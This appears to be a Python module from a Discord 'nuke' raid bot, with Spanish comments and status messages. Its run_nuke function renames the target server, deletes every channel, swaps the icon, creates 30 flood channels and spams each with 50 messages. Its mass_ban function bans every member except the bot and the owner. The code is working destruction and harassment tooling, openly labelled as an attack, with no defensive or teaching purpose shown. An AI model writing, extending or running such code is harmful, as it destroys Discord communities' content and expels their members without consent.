import asyncio
import aiohttp
import discord
from utils.colors import RED, GREEN, YELLOW, BOLD, RESET
from config.settings import get_config

config = get_config()

async def change_server_icon(guild, url):
    """Cambia el icono del servidor"""
    if not url: 
        return
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    await guild.edit(icon=await resp.read())
                    print(f"\n{GREEN}{BOLD}[+] Icono del servidor modificado.{RESET}")
    except Exception as e:
        print(f"\n{RED}{BOLD}[-] Error al cambiar el icono del servidor: {e}{RESET}")

async def run_nuke(ctx):
    """Ejecuta el ataque nuke"""
    guild = ctx.guild
    print(f"\n{RED}{BOLD}[!] ATACANDO SERVIDOR: {guild.name.upper()}{RESET}")
    
    try: 
        await guild.edit(name=config["server_name"])
        print(f"{GREEN}{BOLD}[+] Nombre del servidor cambiado a: {config['server_name']}{RESET}")
    except: 
        print(f"{RED}{BOLD}[-] No se pudo cambiar el nombre del servidor (Falta de permisos).{RESET}")

    print(f"{YELLOW}{BOLD}[*] Eliminando todos los canales existentes...{RESET}")
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
    
    if config["icon_url"]:
        asyncio.create_task(change_server_icon(guild, config["icon_url"]))
    
    print(f"{YELLOW}{BOLD}[*] Creando canales de inundación...{RESET}")
    created_channels = []
    for _ in range(30):
        try:
            ch = await guild.create_text_channel(name=config["channel_name"])
            created_channels.append(ch)
        except: 
            pass
            
    async def send_spam(channel):
        for _ in range(50):
            try:
                await channel.send(config["spam_message"])
                await asyncio.sleep(0.15)
            except: 
                break

    print(f"{GREEN}{BOLD}[+] Inyectando mensajes de spam...{RESET}")
    await asyncio.gather(*[send_spam(ch) for ch in created_channels])
    print(f"\n{GREEN}{BOLD}[✔] Ejecución de comando .nuke finalizada.{RESET}\n")

async def mass_ban(ctx):
    """Banea a todos los usuarios"""
    try: 
        await ctx.message.delete()
    except: 
        pass
    print(f"\n{RED}{BOLD}[!] Aplicando ban general de usuarios...{RESET}")
    tasks = [ctx.guild.ban(m, reason="Nuke Raid") for m in ctx.guild.members if m != ctx.bot.user and m != ctx.guild.owner]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"\n{GREEN}{BOLD}[✔] Ban masivo finalizado.{RESET}")